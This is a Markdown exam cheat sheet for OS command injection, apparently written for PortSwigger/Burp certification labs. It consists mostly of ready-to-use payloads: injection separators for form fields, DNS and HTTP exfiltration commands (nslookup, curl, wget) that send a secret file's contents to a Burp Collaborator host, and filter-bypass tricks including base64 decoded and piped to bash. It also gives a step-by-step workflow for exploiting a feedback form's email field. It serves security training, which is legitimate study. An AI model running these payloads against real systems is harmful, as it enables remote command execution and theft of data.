# OS Command Injection - Stage 3

## 🎯 Target Location

**Primary Target:** Submit Feedback page - Email input field ⭐⭐⭐

## ⚠️ CRITICAL WARNING

**DO NOT rely only on this payload:**
```bash
email=||curl+burp.oastify.com?c=`whoami`||
```

**This works in labs but often FAILS on the exam!**

## 🔥 Recommended Approach: DNS Exfiltration

### Why DNS Exfiltration?
- Works even with only DNS callbacks (no HTTP)
- Bypasses output restrictions
- Reliable on exam

### DNS Exfiltration Payload
```bash
nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com
```

**How it works:**
1. `cat /home/carlos/secret` reads the file
2. `$(...)` captures output as subdomain
3. `nslookup` makes DNS query
4. Secret appears in Burp Collaborator DNS logs

**Example:**
```
File contains: abc123xyz
DNS query: abc123xyz.burp.oastify.com
```

## 📋 Command Injection Payloads

### Basic Detection
```bash
||whoami||
|whoami|
;whoami;
`whoami`
$(whoami)
&&whoami&&
||ping -c 10 burp.oastify.com||
```

### File Read (DNS Exfiltration)
```bash
||nslookup -q=cname $(cat /home/carlos/secret).burp.oastify.com||
||nslookup `cat /home/carlos/secret`.burp.oastify.com||
```

### File Read (HTTP Exfiltration)
```bash
||curl burp.oastify.com?c=$(cat /home/carlos/secret)||
||wget --post-data=$(cat /home/carlos/secret) burp.oastify.com||
```

### Blind Command Injection (Time-Based)
```bash
||sleep 10||
||ping -c 10 127.0.0.1||
```

### Blind Command Injection (Out-of-Band)
```bash
||nslookup burp.oastify.com||
||curl burp.oastify.com||
```

### Output Redirection
```bash
||whoami > /var/www/html/output.txt||
```
Then access: `/output.txt`

## 🛡️ Bypass Techniques

### Space Bypass
```bash
# Use ${IFS}
cat${IFS}/home/carlos/secret

# Use tabs
cat%09/home/carlos/secret

# Use $IFS$9
cat$IFS$9/home/carlos/secret
```

### Keyword Filtering Bypass
```bash
# Concatenation
c''at /home/carlos/secret
c\at /home/carlos/secret

# Hex encoding
$(echo 636174202f686f6d652f6361726c6f732f736563726574 | xxd -r -p)

# Base64 encoding
echo Y2F0IC9ob21lL2Nhcmxvcy9zZWNyZXQ= | base64 -d | bash
```

### Command Separators
```bash
;    # Semicolon
|    # Pipe
||   # OR
&    # Background
&&   # AND
%0a  # Newline
%0d  # Carriage return
```

## 🎓 Exam Tips

1. **Use DNS exfiltration** - `nslookup $(cat /home/carlos/secret).burp.oastify.com`
2. **Test feedback form email field** - Most common location
3. **Try all input fields** - Name, email, subject, message
4. **Use Burp Collaborator** - Essential for out-of-band detection
5. **Be patient** - DNS callbacks may take a few seconds
6. **URL-encode if needed** - Some WAFs require encoding

## 🔍 Testing Workflow

### Step 1: Detect Injection
```bash
email=test@test.com||nslookup burp.oastify.com||
```
Check Burp Collaborator for DNS callback.

### Step 2: Confirm RCE
```bash
email=test@test.com||whoami > /tmp/test||
```

### Step 3: Read File (DNS)
```bash
email=test@test.com||nslookup $(cat /home/carlos/secret).burp.oastify.com||
```

### Step 4: Extract from Collaborator
Check DNS logs for subdomain containing secret.

## 📚 Lab Examples

### Lab 1: Blind with Time Delays
```bash
email=test@test.com||sleep 10||
```

### Lab 2: Blind with Output Redirection
```bash
email=test@test.com||whoami > /var/www/images/output.txt||
```
Access: `/images/output.txt`

### Lab 3: Blind with Out-of-Band
```bash
email=test@test.com||nslookup burp.oastify.com||
```

### Lab 4: Blind with Out-of-Band Data Exfiltration
```bash
email=test@test.com||nslookup $(whoami).burp.oastify.com||
```

### Lab 5: Admin Panel ImgSize Command Injection
**Location:** Admin panel image size feature
```bash
imgSize=100||cat /home/carlos/secret||
```

## 🔗 Common Injection Points

| Location | Parameter | Example |
|----------|-----------|---------|
| Feedback form | `email` | `email=x||whoami||` |
| Feedback form | `name` | `name=x||whoami||` |
| Admin panel | `imgSize` | `imgSize=100||whoami||` |
| Search | `search` | `search=x||whoami||` |

## 📚 References

- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Command Injection Cheat Sheet](https://portswigger.net/web-security/os-command-injection/cheat-sheet)
- [PayloadsAllTheThings Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
